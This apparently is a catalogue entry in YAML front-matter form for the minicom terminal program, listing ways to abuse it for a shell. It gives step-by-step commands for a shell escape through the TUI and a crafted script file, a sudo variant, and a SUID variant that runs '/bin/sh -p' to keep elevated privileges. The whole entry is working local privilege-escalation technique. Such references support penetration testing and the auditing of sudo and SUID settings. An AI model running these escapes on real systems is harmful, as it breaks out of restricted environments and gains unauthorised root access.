---
description: Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.
functions:
  shell:
    - description: |
        Start the following command to open the TUI interface, then:
        1. press `Ctrl-A o` and select `Filenames and paths`;
        2. press `e`, type `/bin/sh`, then `Enter`;
        3. Press `Esc` twice;
        4. Press `Ctrl-A k` to drop the shell.
        After the shell, exit with `Ctrl-A x`.
      code: |
        minicom -D /dev/null
    - description: |
        After the shell, exit with `Ctrl-A x`.
      code: |
        TF=$(mktemp)
        echo "! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)" >$TF
        minicom -D /dev/null -S $TF
        reset^J
  sudo:
    - description: |
        Start the following command to open the TUI interface, then:
        1. press `Ctrl-A o` and select `Filenames and paths`;
        2. press `e`, type `/bin/sh`, then `Enter`;
        3. Press `Esc` twice;
        4. Press `Ctrl-A k` to drop the shell.
        After the shell, exit with `Ctrl-A x`.
      code: |
        sudo minicom -D /dev/null
  suid:
    - description: |
        Start the following command to open the TUI interface, then:
        1. press `Ctrl-A o` and select `Filenames and paths`;
        2. press `e`, type `/bin/sh -p`, then `Enter`;
        3. Press `Esc` twice;
        4. Press `Ctrl-A k` to drop the shell.
        After the shell, exit with `Ctrl-A x`.
      code: |
        ./minicom -D /dev/null
---
